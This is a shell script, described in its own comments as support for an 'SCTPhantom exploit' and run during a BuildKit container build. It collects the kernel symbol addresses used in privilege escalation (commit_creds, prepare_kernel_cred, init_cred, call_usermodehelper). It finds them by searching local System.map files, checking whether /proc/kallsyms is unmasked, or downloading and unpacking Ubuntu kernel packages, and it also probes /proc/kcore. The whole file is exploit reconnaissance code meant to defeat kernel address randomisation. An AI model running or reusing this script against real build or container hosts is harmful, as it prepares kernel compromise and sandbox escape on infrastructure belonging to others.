#!/bin/sh
# Resolve kernel symbol base addresses needed by SCTPhantom exploit
# Runs during BuildKit build. Outputs addresses to /sym_results.txt
set -e

KVER=$(uname -r)
echo "=== SYMBOL RESOLUTION for $KVER ==="

SYMS="commit_creds prepare_kernel_cred asm_exc_divide_error __per_cpu_offset init_user_ns init_cred root_user init_ucounts init_groups call_usermodehelper call_usermodehelper_exec call_usermodehelper_exec_work __static_call_return0 pcpu_hot"
SMAP=""

# Method 1: check local paths
for p in /boot/System.map-$KVER \
         /lib/modules/$KVER/build/System.map \
         /usr/src/linux-headers-$KVER/System.map \
         /usr/lib/debug/boot/System.map-$KVER; do
  if [ -f "$p" ]; then
    echo "FOUND System.map at $p"
    SMAP="$p"
    break
  fi
done

# Method 2: check /proc/kallsyms (might be non-zero if kptr_restrict < 2)
if [ -z "$SMAP" ] && [ -f /proc/kallsyms ]; then
  FIRST=$(head -1 /proc/kallsyms | awk '{print $1}')
  if [ "$FIRST" != "0000000000000000" ]; then
    echo "kallsyms NOT zeroed (kptr_restrict < 2)"
    SMAP="/proc/kallsyms"
  else
    echo "kallsyms zeroed (kptr_restrict=2)"
  fi
fi

# Method 3: try downloading Ubuntu kernel package
if [ -z "$SMAP" ]; then
  echo "Trying Ubuntu package download..."
  # Try security repo first (most likely for kernel updates)
  for REPO in \
    "http://security.ubuntu.com/ubuntu/pool/main/l/linux" \
    "http://archive.ubuntu.com/ubuntu/pool/main/l/linux"; do
    # List available packages for this kernel version
    DEBNAME=$(curl -sL "$REPO/" 2>/dev/null | \
      grep -oE "linux-image-unsigned-${KVER}_[^\"]+_amd64\.deb" | \
      sort -V | tail -1)
    if [ -n "$DEBNAME" ]; then
      echo "Found package: $DEBNAME"
      curl -sL "$REPO/$DEBNAME" -o /tmp/kern.deb 2>/dev/null
      if [ -f /tmp/kern.deb ] && [ -s /tmp/kern.deb ]; then
        echo "Downloaded $(wc -c < /tmp/kern.deb) bytes"
        # Extract System.map from .deb (ar archive)
        cd /tmp
        ar x kern.deb 2>/dev/null || true
        # data might be .tar.xz, .tar.zst, or .tar.gz
        for df in data.tar.xz data.tar.zst data.tar.gz data.tar; do
          if [ -f "$df" ]; then
            echo "Extracting $df..."
            case "$df" in
              *.xz) xz -d "$df" 2>/dev/null; tar xf data.tar "./boot/System.map*" 2>/dev/null || true;;
              *.zst) zstd -d "$df" -o data.tar 2>/dev/null; tar xf data.tar "./boot/System.map*" 2>/dev/null || true;;
              *.gz) gzip -d "$df" 2>/dev/null; tar xf data.tar "./boot/System.map*" 2>/dev/null || true;;
              *.tar) tar xf "$df" "./boot/System.map*" 2>/dev/null || true;;
            esac
            break
          fi
        done
        SM=$(find /tmp/boot -name "System.map*" 2>/dev/null | head -1)
        if [ -n "$SM" ] && [ -f "$SM" ]; then
          echo "Extracted System.map: $SM"
          SMAP="$SM"
        fi
        cd /
        break
      fi
    fi
  done
fi

# Method 4: try linux-modules package (sometimes has symvers)
if [ -z "$SMAP" ]; then
  echo "Trying linux-modules package..."
  for REPO in \
    "http://security.ubuntu.com/ubuntu/pool/main/l/linux" \
    "http://archive.ubuntu.com/ubuntu/pool/main/l/linux"; do
    DEBNAME=$(curl -sL "$REPO/" 2>/dev/null | \
      grep -oE "linux-modules-${KVER}_[^\"]+_amd64\.deb" | \
      sort -V | tail -1)
    if [ -n "$DEBNAME" ]; then
      echo "Found modules package: $DEBNAME"
      curl -sL "$REPO/$DEBNAME" -o /tmp/mod.deb 2>/dev/null
      if [ -f /tmp/mod.deb ] && [ -s /tmp/mod.deb ]; then
        cd /tmp
        ar x mod.deb 2>/dev/null || true
        for df in data.tar.xz data.tar.zst data.tar.gz; do
          if [ -f "$df" ]; then
            case "$df" in
              *.xz) xz -d "$df" 2>/dev/null;;
              *.zst) zstd -d "$df" -o data.tar 2>/dev/null;;
              *.gz) gzip -d "$df" 2>/dev/null;;
            esac
            tar xf data.tar "./boot/System.map*" 2>/dev/null || true
            break
          fi
        done
        SM=$(find /tmp/boot -name "System.map*" 2>/dev/null | head -1)
        if [ -n "$SM" ] && [ -f "$SM" ]; then
          echo "Extracted System.map from modules: $SM"
          SMAP="$SM"
        fi
        cd /
      fi
    fi
  done
fi

# Output results
if [ -n "$SMAP" ]; then
  echo "=== SYMBOL ADDRESSES from $SMAP ==="
  for S in $SYMS; do
    LINE=$(grep -E " [TtDdBbRr] ${S}$" "$SMAP" 2>/dev/null | head -1)
    if [ -n "$LINE" ]; then
      echo "  $LINE"
    else
      echo "  $S: NOT FOUND"
    fi
  done
else
  echo "NO System.map found by any method"
fi

# Also probe /proc/kcore accessibility
echo "=== KCORE PROBE ==="
if [ -f /proc/kcore ]; then
  KCSZ=$(wc -c < /proc/kcore 2>/dev/null || echo "unreadable")
  echo "  /proc/kcore: exists, size=$KCSZ"
  # Try to read ELF header
  dd if=/proc/kcore bs=1 count=16 2>/dev/null | od -A x -t x1z | head -2
else
  echo "  /proc/kcore: NOT FOUND (masked)"
fi

# Check /lib/modules contents
echo "=== MODULES DIR ==="
ls -la /lib/modules/$KVER/ 2>/dev/null | head -20 || echo "  /lib/modules/$KVER: NOT FOUND"
ls -la /lib/modules/$KVER/build/ 2>/dev/null | head -10 || echo "  build symlink: NOT FOUND"

echo "=== END SYMBOL RESOLUTION ==="
